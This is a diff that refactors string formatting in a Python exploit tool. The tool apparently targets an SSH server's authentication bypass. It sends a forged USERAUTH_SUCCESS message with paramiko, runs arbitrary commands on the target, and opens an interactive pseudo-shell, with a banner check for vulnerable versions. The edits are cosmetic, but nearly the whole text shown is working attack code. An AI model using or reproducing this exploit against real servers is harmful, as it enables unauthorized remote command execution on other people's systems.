@@ -65,27 +65,27 @@ class Logger:
     @staticmethod
     def dbg(x):
         if config['debug']:
-            sys.stdout.write('[dbg] ' + x + '\n')
+            sys.stdout.write(f'[dbg] {x}' + '\n')
 
     @staticmethod
     def out(x):
-        Logger._out('[.] ' + x)
+        Logger._out(f'[.] {x}')
 
     @staticmethod
     def info(x):
-        Logger._out('[?] ' + x)
+        Logger._out(f'[?] {x}')
 
     @staticmethod
     def err(x):
-        sys.stdout.write('[!] ' + x + '\n')
+        sys.stdout.write(f'[!] {x}' + '\n')
 
     @staticmethod
     def fail(x):
-        Logger._out('[-] ' + x)
+        Logger._out(f'[-] {x}')
 
     @staticmethod
     def ok(x):
-        Logger._out('[+] ' + x)
+        Logger._out(f'[+] {x}')
 
 class UnauthSSH():
     def __init__(self):
@@ -109,19 +109,17 @@ class UnauthSSH():
 
         if not self.connectionInfoOnce:
             self.connectionInfoOnce = True
-            Logger.info('Connecting with {}:{} ...'.format(
-                self.host, self.port
-            ))
+            Logger.info(f'Connecting with {self.host}:{self.port} ...')
 
         try:
             self.sock.connect((str(self.host), int(self.port)))
             Logger.ok('Connected.')
         except Exception as e:
-            Logger.fail('Could not connect to {}:{} . Exception: {}'.format(
-                self.host, self.port, str(e)
-            ))
+            Logger.fail(
+                f'Could not connect to {self.host}:{self.port} . Exception: {str(e)}'
+            )
             sys.exit(1)
-        
+
         message = paramiko.message.Message()
         message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
 
@@ -143,7 +141,7 @@ class UnauthSSH():
         username = UnauthSSH._send_recv(session, 'username')
         hostname = UnauthSSH._send_recv(session, 'hostname')
 
-        prompt = '{}@{} $ '.format(username, hostname)
+        prompt = f'{username}@{hostname} $ '
 
         while True:
             inp = input(prompt).strip()
@@ -166,12 +164,12 @@ class UnauthSSH():
         username = self.execute('whoami')
         hostname = self.execute('hostname')
 
-        prompt = '{}@{} $ '.format(username, hostname)
-    
+        prompt = f'{username}@{hostname} $ '
+
         if not username or not hostname:
-            Logger.fail('Could not obtain username ({}) and/or hostname ({})!'.format(
-                username, hostname
-            ))
+            Logger.fail(
+                f'Could not obtain username ({username}) and/or hostname ({hostname})!'
+            )
             return
 
         Logger.info('Entering pseudo-shell...')
@@ -220,9 +218,9 @@ class UnauthSSH():
     def _exec(session, inp):
         inp = inp.strip()
 
-        Logger.dbg('Executing command: "{}"'.format(inp))
+        Logger.dbg(f'Executing command: "{inp}"')
         session.exec_command(inp + '\n')
-        
+
         retcode = session.recv_exit_status()
         buf = ''
 
@@ -230,7 +228,7 @@ class UnauthSSH():
             buf += session.recv(config['buflen']).decode()
 
         buf = buf.strip()
-        Logger.dbg('Returned:\n{}'.format(buf))
+        Logger.dbg(f'Returned:\n{buf}')
         return buf
     
     def execute(self, cmd, printout = False, tryAgain = False):
@@ -246,12 +244,12 @@ class UnauthSSH():
                 return self.execute(cmd, printout, True)
 
             if printout and not tryAgain:
-                Logger.fail('Could not execute command ({}): "{}"'.format(cmd, str(e)))
+                Logger.fail(f'Could not execute command ({cmd}): "{str(e)}"')
             return ''
 
         if printout:
-            print('\n{} $ {}'.format(self.host, cmd))
-            print('{}'.format(buf))
+            print(f'\n{self.host} $ {cmd}')
+            print(f'{buf}')
 
         return buf
 
@@ -259,7 +257,7 @@ def exploit():
     handler = UnauthSSH()
     if config['command']:
         out = handler.execute(config['command'])
-        Logger._out('\n$ {}'.format(config['command']))
+        Logger._out(f"\n$ {config['command']}")
         print(out)
     else:
         handler.shell()
@@ -270,7 +268,7 @@ def collectBanner():
 
     try:
         s = socket.create_connection((ip, port), timeout = config['connection_timeout'])
-        Logger.ok('Connected to the target: {}:{}'.format(ip, port))
+        Logger.ok(f'Connected to the target: {ip}:{port}')
         s.settimeout(None)
         banner = s.recv(config['buflen'])
         s.close()
@@ -285,10 +283,8 @@ def check():
     if not config['command'] and not config['shell']:
         config['verbose'] = True
 
-    banner = collectBanner()  
-    
-    if banner:
-        Logger.info('Obtained banner: "{}"'.format(banner.decode().strip()))
+    if banner := collectBanner():
+        Logger.info(f'Obtained banner: "{banner.decode().strip()}"')
 
         #
         # NOTICE: The below version-checking logic was taken from:
@@ -319,7 +315,7 @@ def check():
 
     else:
         Logger.err('Could not obtain SSH service banner.')
-        
+
     return False
 
 def parse_opts():
